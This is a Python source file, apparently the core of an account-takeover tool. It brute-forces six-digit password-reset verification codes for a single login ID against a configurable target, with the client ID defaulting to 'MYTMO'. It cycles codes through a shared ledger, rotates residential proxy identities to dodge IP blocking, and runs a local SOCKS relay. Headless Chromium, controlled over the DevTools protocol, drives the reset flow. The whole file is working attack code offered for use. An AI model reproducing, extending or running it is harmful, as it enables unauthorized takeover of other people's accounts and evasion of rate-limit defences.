"""Clockwork core: ledger, identity pool, SOCKS relay, browser control, flow driver."""
from __future__ import annotations

import json
import os
import socket
import socketserver
import struct
import subprocess
import threading
import time
import urllib.parse
import urllib.request

import websocket

CHROME = os.environ.get("CHROME_BIN", "/usr/bin/chromium")
DATA = os.environ.get("DATA_DIR", "/data")

TARGET_HOST = os.environ["TARGET_HOST"]
ADN_HOST = os.environ["ADN_HOST"]
TOKEN_PATH = os.environ["TOKEN_PATH"]
INIT_PATH = os.environ["INIT_PATH"]
SEND_PATH = os.environ["SEND_PATH"]
VERIFY_PATH = os.environ["VERIFY_PATH"]
LOGIN_ID = os.environ["LOGIN_ID"]
CLIENT_ID = os.environ.get("CLIENT_ID", "MYTMO")
FLOW_INDICATOR = os.environ.get("FLOW_INDICATOR", "password_reset")
SCOPE = os.environ.get("SCOPE", "openid")
REDIRECT_URI = os.environ.get("REDIRECT_URI", "")

PROXY_HOST = os.environ["PROXY_HOST"]
PROXY_PORT = int(os.environ.get("PROXY_PORT", "1080"))
PROXY_PASS = os.environ["PROXY_PASS"]
IDENTITIES = [x.strip() for x in os.environ["IDENTITIES"].split(",") if x.strip()]

PER_CYCLE = int(os.environ.get("PER_CYCLE", "20"))
COOLDOWN = int(os.environ.get("COOLDOWN", "660"))
CONCURRENCY = int(os.environ.get("CONCURRENCY", "3"))
ACCEPT_LANGUAGE = os.environ.get("ACCEPT_LANGUAGE", "en")
LANGUAGE_PREF = os.environ.get("LANGUAGE_PREF", "en")

BASE = "https://" + TARGET_HOST
ADN = "https://" + ADN_HOST

SEM = threading.Semaphore(CONCURRENCY)
LOCK = threading.Lock()


# ---------------------------------------------------------------- ledger
class Ledger:
    """Monotonic code ledger plus the blocked-identity table, shared across workers."""

    def __init__(self, path: str):
        self.path = path
        os.makedirs(os.path.dirname(path), exist_ok=True)
        self.lock_path = path + ".lock"

    def _locked(self):
        fd = os.open(self.lock_path, os.O_CREAT | os.O_RDWR)
        import fcntl
        fcntl.flock(fd, fcntl.LOCK_EX)
        return fd

    def _read(self) -> dict:
        try:
            with open(self.path) as f:
                return json.load(f)
        except Exception:
            return {"next": 0, "spent": 0, "blocked": {}, "done": False}

    def _write(self, d: dict) -> None:
        tmp = self.path + ".tmp"
        with open(tmp, "w") as f:
            json.dump(d, f)
        os.replace(tmp, self.path)

    def next_code(self):
        fd = self._locked()
        try:
            d = self._read()
            if d.get("done"):
                return None
            code = d["next"]
            d["next"] = code + 1
            self._write(d)
            return "%06d" % (code % 1000000)
        finally:
            os.close(fd)

    def blocked(self, ip: str) -> bool:
        fd = self._locked()
        try:
            d = self._read()
            ts = d.get("blocked", {}).get(ip)
            return bool(ts) and time.time() - ts < COOLDOWN
        finally:
            os.close(fd)

    def mark_blocked(self, ip: str) -> None:
        fd = self._locked()
        try:
            d = self._read()
            d.setdefault("blocked", {})[ip] = time.time()
            self._write(d)
        finally:
            os.close(fd)

    def hit(self, code: str, ip: str) -> None:
        fd = self._locked()
        try:
            d = self._read()
            d["done"] = True
            self._write(d)
            with open(os.path.join(DATA, "hits.txt"), "a") as f:
                f.write("%s %s %s\n" % (code, ip, time.strftime("%F %T")))
        finally:
            os.close(fd)

    def spend(self, n: int) -> None:
        fd = self._locked()
        try:
            d = self._read()
            d["spent"] = d.get("spent", 0) + n
            self._write(d)
        finally:
            os.close(fd)

    def finished(self) -> bool:
        fd = self._locked()
        try:
            return bool(self._read().get("done"))
        finally:
            os.close(fd)


# ---------------------------------------------------------------- relay
def _recv_exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise ConnectionError("eof")
        b += c
    return b


class Relay:
    """Local no-auth SOCKS5 -> authenticated upstream with localhost DNS.

    Chrome resolves proxy hostnames at the proxy; many residential providers cannot resolve
    target domains, so resolution is pulled local and the upstream is dialled by IPv4.
    """

    def __init__(self, port: int, user: str):
        self.port = port
        self.user = user
        self._srv = None
        self._thread = None

    def start(self):
        relay = self

        class Handler(socketserver.BaseRequestHandler):
            def handle(self):
                c = self.request
                try:
                    _, n = _recv_exact(c, 2)
                    _recv_exact(c, n)
                    c.sendall(b"\x05\x00")
                    _, cmd, _, atyp = _recv_exact(c, 4)
                    if atyp == 1:
                        host = socket.inet_ntoa(_recv_exact(c, 4))
                    elif atyp == 3:
                        host = _recv_exact(c, _recv_exact(c, 1)[0]).decode()
                    else:
                        host = socket.inet_ntop(socket.AF_INET6, _recv_exact(c, 16))
                    port = struct.unpack(">H", _recv_exact(c, 2))[0]
                    addr = host if atyp != 3 else socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
                    up = None
                    for _ in range(3):
                        try:
                            SEM.acquire()
                            try:
                                up = relay._dial(addr, port)
                            finally:
                                SEM.release()
                            break
                        except Exception:
                            time.sleep(0.3)
                    if up is None:
                        raise ConnectionError("upstream")
                except Exception:
                    try:
                        c.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                    except Exception:
                        pass
                    return
                try:
                    c.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                except Exception:
                    up.close()
                    return

                def pipe(a, b):
                    try:
                        while True:
                            d = a.recv(65536)
                            if not d:
                                break
                            b.sendall(d)
                    except Exception:
                        pass
                    finally:
                        try:
                            b.shutdown(socket.SHUT_WR)
                        except Exception:
                            pass

                threading.Thread(target=pipe, args=(c, up), daemon=True).start()
                pipe(up, c)
                try:
                    up.close()
                except Exception:
                    pass

        class Srv(socketserver.ThreadingTCPServer):
            allow_reuse_address = True
            daemon_threads = True

        self._srv = Srv(("127.0.0.1", self.port), Handler)
        self._thread = threading.Thread(target=self._srv.serve_forever, daemon=True)
        self._thread.start()

    def _dial(self, addr: str, port: int):
        s = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=30)
        s.sendall(b"\x05\x02\x00\x02")
        if _recv_exact(s, 2) != b"\x05\x02":
            raise ConnectionError("auth method")
        u, p = self.user.encode(), PROXY_PASS.encode()
        s.sendall(b"\x01" + bytes([len(u)]) + u + bytes([len(p)]) + p)
        if _recv_exact(s, 2)[1] != 0:
            raise ConnectionError("auth rejected")
        s.sendall(b"\x05\x01\x00\x01" + socket.inet_aton(addr) + struct.pack(">H", port))
        rep = _recv_exact(s, 4)
        if rep[1] != 0:
            raise ConnectionError("connect %d" % rep[1])
        atyp = rep[3]
        _recv_exact(s, 4 if atyp == 1 else 16 if atyp == 4 else _recv_exact(s, 1)[0])
        _recv_exact(s, 2)
        return s

    def stop(self):
        if self._srv:
            self._srv.shutdown()


# ---------------------------------------------------------------- browser
class Browser:
    def __init__(self, relay_port: int, debug_port: int):
        self.debug_port = debug_port
        self.proc = subprocess.Popen(
            [CHROME, "--headless=new", "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
             "--blink-settings=imagesEnabled=%s" % ("true" if os.environ.get("BLOCK_IMAGES") == "0" else "false"),
             "--no-first-run", "--no-default-browser-check",
             "--remote-debugging-port=%d" % debug_port,
             "--user-data-dir=/tmp/prof%d" % debug_port,
             "--proxy-server=socks5://127.0.0.1:%d" % relay_port, "about:blank"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _json(self, path: str, method: str = "GET"):
        url = "http://127.0.0.1:%d%s" % (self.debug_port, path)
        req = urllib.request.Request(url, method=method)
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.load(r)

    def open(self, url: str) -> "Page":
        for _ in range(25):
            try:
                t = self._json("/json/new?" + urllib.parse.quote(url, safe=""), method="PUT")
                return Page(t["webSocketDebuggerUrl"])
            except Exception:
                time.sleep(1)
        raise RuntimeError("cdp unavailable")

    def kill(self):
        try:
            self.proc.terminate()
            self.proc.wait(timeout=10)
        except Exception:
            self.proc.kill()


class Page:
    def __init__(self, ws_url: str):
        self.ws = websocket.create_connection(ws_url, timeout=95)
        self.i = 0

    def call(self, method: str, **params):
        self.i += 1
        self.ws.send(json.dumps({"id": self.i, "method": method, "params": params}))
        while True:
            msg = json.loads(self.ws.recv())
            if msg.get("id") == self.i:
                return msg.get("result", {})

    def js(self, expr: str):
        r = self.call("Runtime.evaluate", expression=expr, returnByValue=True, awaitPromise=True)
        return r.get("result", {}).get("value")

    def host(self) -> str:
        return self.js("location.host") or ""

    def close(self):
        try:
            self.ws.close()
        except Exception:
            pass


# ---------------------------------------------------------------- flow
FLOW_JS = open(os.path.join(os.path.dirname(__file__), "flow.js")).read()


def flow_config() -> dict:
    return {
        "base": BASE, "adn": ADN, "tokenPath": TOKEN_PATH, "initPath": INIT_PATH,
        "sendPath": SEND_PATH, "verifyPath": VERIFY_PATH, "loginId": LOGIN_ID,
        "clientId": CLIENT_ID, "flowIndicator": FLOW_INDICATOR, "scope": SCOPE,
        "redirectUri": REDIRECT_URI, "acceptLanguage": ACCEPT_LANGUAGE,
        "languagePref": LANGUAGE_PREF,
    }
